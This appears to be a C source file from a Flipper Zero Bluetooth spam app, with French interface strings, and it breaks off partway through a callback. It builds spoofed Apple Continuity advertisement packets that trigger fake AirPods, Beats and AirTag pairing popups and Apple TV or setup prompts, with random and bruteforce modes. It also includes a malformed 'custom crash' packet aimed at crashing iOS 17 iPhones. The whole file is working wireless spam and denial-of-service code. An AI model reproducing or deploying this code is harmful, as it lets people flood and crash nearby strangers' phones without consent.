#include "continuity.h"
#include "_protocols.h"

// Hacked together by @Willy-JL
// iOS 17 Crash by @ECTO-1A
// Nearby Action IDs and Documentation at https://github.com/furiousMAC/continuity/
// Proximity Pair IDs from https://github.com/ECTO-1A/AppleJuice/

typedef struct {
    uint8_t value;
    const char* name;
} ContinuityColor;

static const ContinuityColor colors_white[] = {
    {0x00, "Blanc"},
};
static const ContinuityColor colors_airpods_max[] = {
    {0x00, "Blanc"},
    {0x02, "Rouge"},
    {0x03, "Bleu"},
    {0x0F, "Noir"},
    {0x11, "Vert clair"},
};
static const ContinuityColor colors_beats_flex[] = {
    {0x00, "Blanc"},
    {0x01, "Black"},
};
static const ContinuityColor colors_beats_solo_3[] = {
    {0x00, "Blanc"},
    {0x01, "Noir"},
    {0x6, "Gris"},
    {0x7, "Or/Blanc"},
    {0x8, "Or rose"},
    {0x09, "Noir"},
    {0xE, "Violet/Blanc"},
    {0xF, "Rouge vif"},
    {0x12, "Rouge fonc""\xE9"},
    {0x13, "Vert marais"},
    {0x14, "Gris fonc""\xE9"},
    {0x15, "Bleu fonc""\xE9"},
    {0x1D, "Or rose 2"},
    {0x20, "Bleu/Vert"},
    {0x21, "Violet/Orange"},
    {0x22, "Bleu profond/Bleu clair"},
    {0x23, "Magenta/Fuchsia clair"},
    {0x25, "Noir/Rouge"},
    {0x2A, "Gris/Disney LTD"},
    {0x2E, "Blanc rosé"},
    {0x3D, "Rouge/Bleu"},
    {0x3E, "Jaune/Bleu"},
    {0x3F, "Blanc/Rouge"},
    {0x40, "Violet/Blanc"},
    {0x5B, "Or"},
    {0x5C, "Argent"},
};
static const ContinuityColor colors_powerbeats_3[] = {
	{0x00, "Blanc"},
    {0x01, "Noir"},
    {0x0B, "Gris/Bleu"},
    {0x0C, "Gris/Rouge"},
    {0x0D, "Gris/Vert"},
    {0x12, "Rouge"},
    {0x13, "Vert marais"},
    {0x14, "Gris"},
    {0x15, "Bleu profond"},
    {0x17, "Sombre avec logo or"},
};
static const ContinuityColor colors_powerbeats_pro[] = {
	{0x00, "Blanc"},
    {0x02, "Vert jaunis"},
    {0x03, "Bleu"},
    {0x04, "Noir"},
    {0x05, "Rose"},
    {0x06, "Rouge"},
    {0x0B, "Gris ?"},
    {0x0D, "Bleu ciel"},
};
static const ContinuityColor colors_beats_solo_pro[] = {
	{0x00, "Blanc"},
    {0x01, "Noir"},
};
static const ContinuityColor colors_beats_studio_buds[] = {
    {0x00, "Blanc"},
    {0x01, "Noir"},
    {0x02, "Rouge"},
    {0x03, "Bleu"},
    {0x04, "Rose"},
    {0x06, "Argent"},
};
static const ContinuityColor colors_beats_x[] = {
    {0x00, "Blanc"},
    {0x01, "Noir"},
    {0x02, "Bleu"},
    {0x05, "Gris"},
    {0x1D, "Rose"},
    {0x25, "Sombre/Rouge"},
};
static const ContinuityColor colors_beats_studio_3[] = {
    {0x00, "Blanc"},
    {0x01, "Noir"},
    {0x02, "Rouge"},
    {0x03, "Bleu"},
    {0x18, "Gris Ombre"},
    {0x19, "Sable du D""\xE9""sert"},
    {0x25, "Noir/Rouge"},
    {0x26, "Noir Minuit"},
    {0x27, "Sable du D""\xE9""sert 2"},
    {0x28, "Gris"},
    {0x29, "Bleu clair / Or"},
    {0x42, "Camo For""\xEA""t Verte"},
    {0x43, "Camo Blanc"},
};
static const ContinuityColor colors_beats_studio_pro[] = {
    {0x00, "Blanc"},
    {0x01, "Noir"},
};
static const ContinuityColor colors_beats_fit_pro[] = {
    {0x00, "Blanc"},
    {0x01, "Noir"},
    {0x02, "Rose"},
    {0x03, "Gris/Blanc"},
    {0x04, "Rose Intégral"},
    {0x05, "Vert N""\xE9""on"},
    {0x06, "Bleu Nuit"},
    {0x07, "Rose Clair"},
    {0x08, "Marron"},
    {0x09, "Marron Fonc""\xE9"},
};
static const ContinuityColor colors_beats_studio_buds_[] = {
    {0x00, "Noir"},
    {0x01, "Blanc"},
    {0x02, "Transparent"},
    {0x03, "Argent"},
    {0x04, "Rose"},
};

static const struct {
    uint16_t value;
    const char* name;
    const ContinuityColor* colors;
    const uint8_t colors_count;
} pp_models[] = {
    {0x0E20, "AirPods Pro", colors_white, COUNT_OF(colors_white)},
    {0x0A20, "AirPods Max", colors_airpods_max, COUNT_OF(colors_airpods_max)},
    {0x0055, "Airtag", colors_white, COUNT_OF(colors_white)},
    {0x0030, "Hermes Airtag", colors_white, COUNT_OF(colors_white)},
    {0x0220, "AirPods", colors_white, COUNT_OF(colors_white)},
    {0x0F20, "AirPods 2e Gen", colors_white, COUNT_OF(colors_white)},
    {0x1320, "AirPods 3e Gen", colors_white, COUNT_OF(colors_white)},
    {0x1420, "AirPods Pro 2e Gen", colors_white, COUNT_OF(colors_white)},
    {0x1020, "Beats Flex", colors_beats_flex, COUNT_OF(colors_beats_flex)},
    {0x0620, "Beats Solo 3", colors_beats_solo_3, COUNT_OF(colors_beats_solo_3)},
    {0x0320, "Powerbeats 3", colors_powerbeats_3, COUNT_OF(colors_powerbeats_3)},
    {0x0B20, "Powerbeats Pro", colors_powerbeats_pro, COUNT_OF(colors_powerbeats_pro)},
    {0x0C20, "Beats Solo Pro", colors_beats_solo_pro, COUNT_OF(colors_beats_solo_pro)},
    {0x1120, "Beats Studio Buds", colors_beats_studio_buds, COUNT_OF(colors_beats_studio_buds)},
    {0x0520, "Beats X", colors_beats_x, COUNT_OF(colors_beats_x)},
    {0x0920, "Beats Studio 3", colors_beats_studio_3, COUNT_OF(colors_beats_studio_3)},
    {0x1720, "Beats Studio Pro", colors_beats_studio_pro, COUNT_OF(colors_beats_studio_pro)},
    {0x1220, "Beats Fit Pro", colors_beats_fit_pro, COUNT_OF(colors_beats_fit_pro)},
    {0x1620, "Beats Studio Buds+", colors_beats_studio_buds_, COUNT_OF(colors_beats_studio_buds_)},
};
static const uint8_t pp_models_count = COUNT_OF(pp_models);
static const struct {
    uint8_t value;
    const char* name;
} pp_prefixes[] = {
    {0x07, "Nouvel appareil"},
    {0x01, "Pas votre appareil"},
    {0x05, "Nouvel Airtag"},
};
static const uint8_t pp_prefixes_count = COUNT_OF(pp_prefixes);
static const struct {
    uint8_t value;
    const char* name;
} na_actions[] = {
    {0x13, "Remplissage auto AppleTV"},
    {0x24, "Vision Pro Apple"},
    {0x05, "Apple Watch"},
    {0x27, "Connexion AppleTV..."},
    {0x20, "Rejoindre l'AppleTV ?"},
    {0x19, "Synchro audio AppleTV"},
    {0x1E, "Balance couleurs AppleTV"},
    {0x09, "Config du nouvel iPhone"},
    {0x2F, "Connexion ""\xE0"" un autre appareil"},
    {0x02, "Transfert de num""\xE9""ro de tel"},
    {0x0B, "Config HomePod"},
    {0x01, "Config nouvelle AppleTV"},
    {0x06, "Associer AppleTV"},
    {0x0D, "Config HomeKit AppleTV"},
    {0x2B, "Identifiant Apple AppleTV ?"}, 
};
static const uint8_t na_actions_count = COUNT_OF(na_actions);

static const char* type_names[ContinuityTypeCOUNT] = {
    [ContinuityTypeAirDrop] = "AirDrop",
    [ContinuityTypeProximityPair] = "Boucle appairage",
    [ContinuityTypeAirplayTarget] = "Cible de diffusion",
    [ContinuityTypeHandoff] = "Handoff",
    [ContinuityTypeTetheringSource] = "Source de connexion",
    [ContinuityTypeNearbyAction] = "Action Continue",
    [ContinuityTypeNearbyInfo] = "Info de proximit""\xE9",
    [ContinuityTypeCustomCrash] = "Continuit""\xE9"" perso",
};
static const char* get_name(const Payload* payload) {
    const ContinuityCfg* cfg = &payload->cfg.continuity;
    return type_names[cfg->type];
}

#define HEADER_LEN (6) // 1 Size + 1 AD Type + 2 Company ID + 1 Continuity Type + 1 Continuity Size
static uint8_t packet_sizes[ContinuityTypeCOUNT] = {
    [ContinuityTypeAirDrop] = HEADER_LEN + 18,
    [ContinuityTypeProximityPair] = HEADER_LEN + 25,
    [ContinuityTypeAirplayTarget] = HEADER_LEN + 6,
    [ContinuityTypeHandoff] = HEADER_LEN + 14,
    [ContinuityTypeTetheringSource] = HEADER_LEN + 6,
    [ContinuityTypeNearbyAction] = HEADER_LEN + 5,
    [ContinuityTypeNearbyInfo] = HEADER_LEN + 5,
    [ContinuityTypeCustomCrash] = HEADER_LEN + 11,
};
static void make_packet(uint8_t* _size, uint8_t** _packet, Payload* payload) {
    ContinuityCfg* cfg = payload ? &payload->cfg.continuity : NULL;

    ContinuityType type;
    if(cfg && cfg->type != 0x00) {
        type = cfg->type;
    } else {
        const ContinuityType types[] = {
            ContinuityTypeProximityPair,
            ContinuityTypeNearbyAction,
            ContinuityTypeCustomCrash,
        };
        type = types[rand() % COUNT_OF(types)];
    }

    uint8_t size = packet_sizes[type];
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = size - 1; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0x4C; // Company ID (Apple, Inc.)
    packet[i++] = 0x00; // ...
    packet[i++] = type; // Continuity Type
    packet[i] = size - i - 1; // Continuity Size
    i++;

    switch(type) {
    case ContinuityTypeAirDrop: {
        packet[i++] = 0x00; // Zeros
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x01; // Version
        packet[i++] = (rand() % 256); // AppleID
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // Phone Number
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // Email
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // Email2
        packet[i++] = (rand() % 256); // ...
        packet[i++] = 0x00; // Zero
        break;
    }

    case ContinuityTypeProximityPair: {
        uint16_t model;
        uint8_t color;
        switch(payload ? payload->mode : PayloadModeRandom) {
        case PayloadModeRandom:
        default: {
            uint8_t model_index = rand() % pp_models_count;
            uint8_t color_index = rand() % pp_models[model_index].colors_count;
            model = pp_models[model_index].value;
            color = pp_models[model_index].colors[color_index].value;
            break;
        }
        case PayloadModeValue:
            model = cfg->data.proximity_pair.model;
            color = cfg->data.proximity_pair.color;
            break;
        case PayloadModeBruteforce:
            switch(cfg->data.proximity_pair.bruteforce_mode) {
            case ContinuityPpBruteforceModel:
            default:
                model = cfg->data.proximity_pair.model = payload->bruteforce.value;
                color = cfg->data.proximity_pair.color;
                break;
            case ContinuityPpBruteforceColor:
                model = cfg->data.proximity_pair.model;
                color = cfg->data.proximity_pair.color = payload->bruteforce.value;
                break;
            }
            break;
        }

        uint8_t prefix;
        if(cfg && cfg->data.proximity_pair.prefix != 0x00) {
            prefix = cfg->data.proximity_pair.prefix;
        } else {
            if(model == 0x0055 || model == 0x0030)
                prefix = 0x05;
            else
                prefix = 0x01;
        }

        packet[i++] = prefix; // Prefix (paired 0x01 new 0x07 airtag 0x05)
        packet[i++] = (model >> 0x08) & 0xFF; // Device Model
        packet[i++] = (model >> 0x00) & 0xFF; // ...
        packet[i++] = 0x55; // Status
        packet[i++] = ((rand() % 10) << 4) + (rand() % 10); // Buds Battery Level
        packet[i++] = ((rand() % 8) << 4) + (rand() % 10); // Charing Status and Battery Case Level
        packet[i++] = (rand() % 256); // Lid Open Counter
        packet[i++] = color; // Device Color
        packet[i++] = 0x00;
        furi_hal_random_fill_buf(&packet[i], 16); // Encrypted Payload
        i += 16;
        break;
    }

    case ContinuityTypeAirplayTarget: {
        packet[i++] = (rand() % 256); // Flags
        packet[i++] = (rand() % 256); // Configuration Seed
        packet[i++] = (rand() % 256); // IPv4 Address
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        break;
    }

    case ContinuityTypeHandoff: {
        packet[i++] = 0x01; // Version
        packet[i++] = (rand() % 256); // Initialization Vector
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // AES-GCM Auth Tag
        packet[i++] = (rand() % 256); // Encrypted Payload
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        break;
    }

    case ContinuityTypeTetheringSource: {
        packet[i++] = 0x01; // Version
        packet[i++] = (rand() % 256); // Flags
        packet[i++] = (rand() % 101); // Battery Life
        packet[i++] = 0x00; // Cell Service Type
        packet[i++] = (rand() % 8); // ...
        packet[i++] = (rand() % 5); // Cell Service Strength
        break;
    }

    case ContinuityTypeNearbyAction: {
        uint8_t action;
        switch(payload ? payload->mode : PayloadModeRandom) {
        case PayloadModeRandom:
        default:
            action = na_actions[rand() % na_actions_count].value;
            break;
        case PayloadModeValue:
            action = cfg->data.nearby_action.action;
            break;
        case PayloadModeBruteforce:
            action = cfg->data.nearby_action.action = payload->bruteforce.value;
            break;
        }

        uint8_t flags;
        if(cfg && cfg->data.nearby_action.flags != 0x00) {
            flags = cfg->data.nearby_action.flags;
        } else {
            flags = 0xC0;
            if(action == 0x20 && rand() % 2) flags--; // More spam for 'Join This AppleTV?'
            if(action == 0x09 && rand() % 2) flags = 0x40; // Glitched 'Setup New Device'
        }

        packet[i++] = flags; // Action Flags
        packet[i++] = action; // Action Type
        furi_hal_random_fill_buf(&packet[i], 3); // Authentication Tag
        i += 3;
        break;
    }

    case ContinuityTypeNearbyInfo: {
        packet[i++] = ((rand() % 16) << 4) + (rand() % 16); // Status Flags and Action Code
        packet[i++] = (rand() % 256); // Status Flags
        packet[i++] = (rand() % 256); // Authentication Tag
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        break;
    }

    case ContinuityTypeCustomCrash: {
        // Found by @ECTO-1A

        uint8_t action = na_actions[rand() % na_actions_count].value;
        uint8_t flags = 0xC0;
        if(action == 0x20 && rand() % 2) flags--; // More spam for 'Join This AppleTV?'
        if(action == 0x09 && rand() % 2) flags = 0x40; // Glitched 'Setup New Device'

        i -= 2; // Override segment header
        packet[i++] = ContinuityTypeNearbyAction; // Continuity Type
        packet[i++] = 5; // Continuity Size
        packet[i++] = flags; // Action Flags
        packet[i++] = action; // Action Type
        furi_hal_random_fill_buf(&packet[i], 3); // Authentication Tag
        i += 3;

        packet[i++] = 0x00; // Additional Action Data Terminator (?)
        packet[i++] = 0x00; // ...

        packet[i++] = ContinuityTypeNearbyInfo; // Continuity Type (?)
        furi_hal_random_fill_buf(&packet[i], 3); // Continuity Size (?) + Shenanigans (???)
        i += 3;
        break;
    }

    default:
        break;
    }

    *_size = size;
    *_packet = packet;
}

enum {
    _ConfigPpExtraStart = ConfigExtraStart,
    ConfigPpModel,
    ConfigPpColor,
    ConfigPpPrefix,
    ConfigPpCOUNT,
};
enum {
    _ConfigNaExtraStart = ConfigExtraStart,
    ConfigNaAction,
    ConfigNaFlags,
    ConfigNaCOUNT,
};
enum {
    _ConfigCcExtraStart = ConfigExtraStart,
    ConfigCcInfoFixed,
    ConfigCcInfoLock,
    ConfigCcInfoDevice,
    ConfigCcCOUNT,
};
static void config_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    scene_manager_set_scene_state(ctx->scene_manager, SceneConfig, index);
    switch(cfg->type) {
    case ContinuityTypeProximityPair: {
        switch(index) {
        case ConfigPpModel:
            scene_manager_next_scene(ctx->scene_manager, SceneContinuityPpModel);
            break;
        case ConfigPpColor:
            if(payload->mode != PayloadModeRandom)
                scene_manager_next_scene(ctx->scene_manager, SceneContinuityPpColor);
            break;
        case ConfigPpPrefix:
            scene_manager_next_scene(ctx->scene_manager, SceneContinuityPpPrefix);
            break;
        default:
            ctx->fallback_config_enter(ctx, index);
            break;
        }
        break;
    }
    case ContinuityTypeNearbyAction: {
        switch(index) {
        case ConfigNaAction:
            scene_manager_next_scene(ctx->scene_manager, SceneContinuityNaAction);
            break;
        case ConfigNaFlags:
            scene_manager_next_scene(ctx->scene_manager, SceneContinuityNaFlags);
            break;
        default:
            ctx->fallback_config_enter(ctx, index);
            break;
        }
        break;
    }
    case ContinuityTypeCustomCrash: {
        switch(index) {
        case ConfigCcInfoLock:
        case ConfigCcInfoDevice:
            break;
        default:
            ctx->fallback_config_enter(ctx, index);
            break;
        }
        break;
    }
    default:
        ctx->fallback_config_enter(ctx, index);
        break;
    }
}
static void pp_model_changed(VariableItem* item) {
    Ctx* ctx = variable_item_get_context(item);
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    uint8_t index = variable_item_get_current_value_index(item);
    const char* color_name = NULL;
    char color_name_buf[3];
    uint8_t colors_count;
    uint8_t value_index_color;
    if(index) {
        index--;
        if(payload->mode != PayloadModeBruteforce ||
           cfg->data.proximity_pair.bruteforce_mode == ContinuityPpBruteforceModel)
            payload->mode = PayloadModeValue;
        cfg->data.proximity_pair.model = pp_models[index].value;
        variable_item_set_current_value_text(item, pp_models[index].name);
        colors_count = pp_models[index].colors_count;
        if(payload->mode == PayloadModeValue) {
            for(uint8_t j = 0; j < colors_count; j++) {
                if(cfg->data.proximity_pair.color == pp_models[index].colors[j].value) {
                    color_name = pp_models[index].colors[j].name;
                    value_index_color = j;
                    break;
                }
            }
            if(!color_name) {
                snprintf(
                    color_name_buf, sizeof(color_name_buf), "%02X", cfg->data.proximity_pair.color);
                color_name = color_name_buf;
                value_index_color = colors_count;
            }
        } else {
            color_name = "Bruteforce";
            value_index_color = colors_count;
        }
    } else {
        payload->mode = PayloadModeRandom;
        variable_item_set_current_value_text(item, "Random");
        color_name = "Random";
        colors_count = 1;
        value_index_color = 0;
    }
    item = variable_item_list_get(ctx->variable_item_list, ConfigPpColor);
    variable_item_set_values_count(item, colors_count);
    variable_item_set_current_value_index(item, value_index_color);
    variable_item_set_current_value_text(item, color_name);
}
static void pp_color_changed(VariableItem* item) {
    Payload* payload = variable_item_get_context(item);
    ContinuityCfg* cfg = &payload->cfg.continuity;
    uint8_t index = variable_item_get_current_value_index(item);
    if(payload->mode != PayloadModeBruteforce ||
       cfg->data.proximity_pair.bruteforce_mode == ContinuityPpBruteforceColor)
        payload->mode = PayloadModeValue;
    uint8_t model_index = 0;
    for(; model_index < pp_models_count; model_index++) {
        if(cfg->data.proximity_pair.model == pp_models[model_index].value) break;
    }
    cfg->data.proximity_pair.color = pp_models[model_index].colors[index].value;
    variable_item_set_current_value_text(item, pp_models[model_index].colors[index].name);
}
static void pp_prefix_changed(VariableItem* item) {
    Payload* payload = variable_item_get_context(item);
    ContinuityCfg* cfg = &payload->cfg.continuity;
    uint8_t index = variable_item_get_current_value_index(item);
    if(index) {
        index--;
        cfg->data.proximity_pair.prefix = pp_prefixes[index].value;
        variable_item_set_current_value_text(item, pp_prefixes[index].name);
    } else {
        cfg->data.proximity_pair.prefix = 0x00;
        variable_item_set_current_value_text(item, "Auto");
    }
}
static void na_action_changed(VariableItem* item) {
    Payload* payload = variable_item_get_context(item);
    ContinuityCfg* cfg = &payload->cfg.continuity;
    uint8_t index = variable_item_get_current_value_index(item);
    if(index) {
        index--;
        payload->mode = PayloadModeValue;
        cfg->data.nearby_action.action = na_actions[index].value;
        variable_item_set_current_value_text(item, na_actions[index].name);
    } else {
        payload->mode = PayloadModeRandom;
        variable_item_set_current_value_text(item, "Random");
    }
}
static void extra_config(Ctx* ctx) {
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    VariableItemList* list = ctx->variable_item_list;
    VariableItem* item;
    uint8_t value_index;

    switch(cfg->type) {
    case ContinuityTypeProximityPair: {
        item =
            variable_item_list_add(list, "Model Code", pp_models_count + 1, pp_model_changed, ctx);
        const char* model_name = NULL;
        char model_name_buf[5];
        const char* color_name = NULL;
        char color_name_buf[3];
        uint8_t colors_count;
        uint8_t value_index_color;
        switch(payload->mode) {
        case PayloadModeRandom:
        default:
            model_name = "Random";
            value_index = 0;
            color_name = "Random";
            colors_count = 1;
            value_index_color = 0;
            break;
        case PayloadModeValue:
            for(uint8_t i = 0; i < pp_models_count; i++) {
                if(cfg->data.proximity_pair.model == pp_models[i].value) {
                    model_name = pp_models[i].name;
                    value_index = i + 1;
                    colors_count = pp_models[i].colors_count;
                    for(uint8_t j = 0; j < colors_count; j++) {
                        if(cfg->data.proximity_pair.color == pp_models[i].colors[j].value) {
                            color_name = pp_models[i].colors[j].name;
                            value_index_color = j;
                            break;
                        }
                    }
                    break;
                }
            }
            if(!model_name) {
                snprintf(
                    model_name_buf, sizeof(model_name_buf), "%04X", cfg->data.proximity_pair.model);
                model_name = model_name_buf;
                value_index = pp_models_count + 1;
                colors_count = 0;
            }
            if(!color_name) {
                snprintf(
                    color_name_buf, sizeof(color_name_buf), "%02X", cfg->data.proximity_pair.color);
                color_name = color_name_buf;
                value_index_color = colors_count;
            }
            break;
        case PayloadModeBruteforce:
            switch(cfg->data.proximity_pair.bruteforce_mode) {
            case ContinuityPpBruteforceModel:
            default:
                model_name = "Bruteforce";
                value_index = pp_models_count + 1;
                snprintf(
                    color_name_buf, sizeof(color_name_buf), "%02X", cfg->data.proximity_pair.color);
                color_name = color_name_buf;
                colors_count = 1;
                value_index_color = 0;
                break;
            case ContinuityPpBruteforceColor:
                for(uint8_t i = 0; i < pp_models_count; i++) {
                    if(cfg->data.proximity_pair.model == pp_models[i].value) {
                        model_name = pp_models[i].name;
                        value_index = i + 1;
                        colors_count = pp_models[i].colors_count;
                        break;
                    }
                }
                if(!model_name) {
                    snprintf(
                        model_name_buf,
                        sizeof(model_name_buf),
                        "%04X",
                        cfg->data.proximity_pair.model);
                    model_name = model_name_buf;
                    value_index = pp_models_count + 1;
                    colors_count = 0;
                }
                color_name = "Bruteforce";
                value_index_color = colors_count;
                break;
            }
            break;
        }
        variable_item_set_current_value_index(item, value_index);
        variable_item_set_current_value_text(item, model_name);

        item =
            variable_item_list_add(list, "Couleur appareil", colors_count, pp_color_changed, payload);
        variable_item_set_current_value_index(item, value_index_color);
        variable_item_set_current_value_text(item, color_name);

        item = variable_item_list_add(
            list, "Prefix", pp_prefixes_count + 1, pp_prefix_changed, payload);
        const char* prefix_name = NULL;
        char prefix_name_buf[3];
        if(cfg->data.proximity_pair.prefix == 0x00) {
            prefix_name = "Auto";
            value_index = 0;
        } else {
            for(uint8_t i = 0; i < pp_prefixes_count; i++) {
                if(cfg->data.proximity_pair.prefix == pp_prefixes[i].value) {
                    prefix_name = pp_prefixes[i].name;
                    value_index = i + 1;
                    break;
                }
            }
            if(!prefix_name) {
                snprintf(
                    prefix_name_buf,
                    sizeof(prefix_name_buf),
                    "%02X",
                    cfg->data.proximity_pair.prefix);
                prefix_name = prefix_name_buf;
                value_index = pp_prefixes_count + 1;
            }
        }
        variable_item_set_current_value_index(item, value_index);
        variable_item_set_current_value_text(item, prefix_name);
        break;
    }
    case ContinuityTypeNearbyAction: {
        item = variable_item_list_add(
            list, "Action Type", na_actions_count + 1, na_action_changed, payload);
        const char* action_name = NULL;
        char action_name_buf[3];
        switch(payload->mode) {
        case PayloadModeRandom:
        default:
            action_name = "Random";
            value_index = 0;
            break;
        case PayloadModeValue:
            for(uint8_t i = 0; i < na_actions_count; i++) {
                if(cfg->data.nearby_action.action == na_actions[i].value) {
                    action_name = na_actions[i].name;
                    value_index = i + 1;
                    break;
                }
            }
            if(!action_name) {
                snprintf(
                    action_name_buf,
                    sizeof(action_name_buf),
                    "%02X",
                    cfg->data.nearby_action.action);
                action_name = action_name_buf;
                value_index = na_actions_count + 1;
            }
            break;
        case PayloadModeBruteforce:
            action_name = "Bruteforce";
            value_index = na_actions_count + 1;
            break;
        }
        variable_item_set_current_value_index(item, value_index);
        variable_item_set_current_value_text(item, action_name);

        item = variable_item_list_add(list, "Flags", 0, NULL, NULL);
        const char* flags_name = NULL;
        char flags_name_buf[3];
        if(cfg->data.nearby_action.flags == 0x00) {
            flags_name = "Auto";
        } else {
            snprintf(
                flags_name_buf, sizeof(flags_name_buf), "%02X", cfg->data.nearby_action.flags);
            flags_name = flags_name_buf;
        }
        variable_item_set_current_value_text(item, flags_name);
        break;
    }
    case ContinuityTypeCustomCrash: {
        variable_item_list_add(list, "CRASH IOS 17.2 CORRIG""\xC9""", 0, NULL, NULL);
        variable_item_list_add(list, "Lock+unlock aide ""\xE0"" crash", 0, NULL, NULL);
        variable_item_list_add(list, "Pour iPhone 12 et plus", 0, NULL, NULL);
        break;
    }
    default:
        break;
    }

    variable_item_list_set_enter_callback(list, config_callback, ctx);
}

static uint8_t config_counts[ContinuityTypeCOUNT] = {
    [ContinuityTypeAirDrop] = 0,
    [ContinuityTypeProximityPair] = ConfigPpCOUNT - ConfigExtraStart - 1,
    [ContinuityTypeAirplayTarget] = 0,
    [ContinuityTypeHandoff] = 0,
    [ContinuityTypeTetheringSource] = 0,
    [ContinuityTypeNearbyAction] = ConfigNaCOUNT - ConfigExtraStart - 1,
    [ContinuityTypeNearbyInfo] = 0,
    [ContinuityTypeCustomCrash] = ConfigCcCOUNT - ConfigExtraStart - 1,
};
static uint8_t config_count(const Payload* payload) {
    const ContinuityCfg* cfg = &payload->cfg.continuity;
    return config_counts[cfg->type];
}

const Protocol protocol_continuity = {
    .icon = &I_apple,
    .get_name = get_name,
    .make_packet = make_packet,
    .extra_config = extra_config,
    .config_count = config_count,
};

static void pp_model_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    switch(index) {
    case 0:
        payload->mode = PayloadModeRandom;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    case pp_models_count + 1:
        scene_manager_next_scene(ctx->scene_manager, SceneContinuityPpModelCustom);
        break;
    case pp_models_count + 2:
        payload->mode = PayloadModeBruteforce;
        payload->bruteforce.counter = 0;
        payload->bruteforce.value = cfg->data.proximity_pair.model;
        payload->bruteforce.size = 2;
        cfg->data.proximity_pair.bruteforce_mode = ContinuityPpBruteforceModel;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    default:
        if(payload->mode != PayloadModeBruteforce ||
           cfg->data.proximity_pair.bruteforce_mode == ContinuityPpBruteforceModel)
            payload->mode = PayloadModeValue;
        cfg->data.proximity_pair.model = pp_models[index - 1].value;
        scene_manager_previous_scene(ctx->scene_manager);
        break;
    }
}
void scene_continuity_pp_model_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    Submenu* submenu = ctx->submenu;
    uint32_t selected = 0;
    bool value = payload->mode == PayloadModeValue ||
                 (payload->mode == PayloadModeBruteforce &&
                  cfg->data.proximity_pair.bruteforce_mode != ContinuityPpBruteforceModel);

    submenu_add_item(submenu, "Random", 0, pp_model_callback, ctx);
    if(payload->mode == PayloadModeRandom) {
        selected = 0;
    }

    bool found = false;
    for(uint8_t i = 0; i < pp_models_count; i++) {
        submenu_add_item(submenu, pp_models[i].name, i + 1, pp_model_callback, ctx);
        if(!found && value && cfg->data.proximity_pair.model == pp_models[i].value) {
            found = true;
            selected = i + 1;
        }
    }
    submenu_add_item(submenu, "Perso", pp_models_count + 1, pp_model_callback, ctx);
    if(!found && value) {
        selected = pp_models_count + 1;
    }

    submenu_add_item(submenu, "Bruteforce", pp_models_count + 2, pp_model_callback, ctx);
    if(!value && payload->mode == PayloadModeBruteforce) {
        selected = pp_models_count + 2;
    }

    submenu_set_selected_item(submenu, selected);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewSubmenu);
}
bool scene_continuity_pp_model_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_continuity_pp_model_on_exit(void* _ctx) {
    Ctx* ctx = _ctx;
    submenu_reset(ctx->submenu);
}

static void pp_model_custom_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    if(payload->mode != PayloadModeBruteforce ||
       cfg->data.proximity_pair.bruteforce_mode == ContinuityPpBruteforceModel)
        payload->mode = PayloadModeValue;
    cfg->data.proximity_pair.model = (ctx->byte_store[0] << 0x08) + (ctx->byte_store[1] << 0x00);
    scene_manager_previous_scene(ctx->scene_manager);
    scene_manager_previous_scene(ctx->scene_manager);
}
void scene_continuity_pp_model_custom_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    ByteInput* byte_input = ctx->byte_input;

    byte_input_set_header_text(byte_input, "Entrez le mod""\xE8""le code perso");

    ctx->byte_store[0] = (cfg->data.proximity_pair.model >> 0x08) & 0xFF;
    ctx->byte_store[1] = (cfg->data.proximity_pair.model >> 0x00) & 0xFF;

    byte_input_set_result_callback(
        byte_input, pp_model_custom_callback, NULL, ctx, (void*)ctx->byte_store, 2);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewByteInput);
}
bool scene_continuity_pp_model_custom_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_continuity_pp_model_custom_on_exit(void* _ctx) {
    UNUSED(_ctx);
}

static void pp_color_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    Payload* payload = &ctx->attack->payload;
    ContinuityCfg* cfg = &payload->cfg.continuity;
    uint8_t model_index = 0;
    uint8_t colors_count = 0;
    if(payload->mode == PayloadModeValue ||
       (payload->mode == PayloadModeBruteforce &&
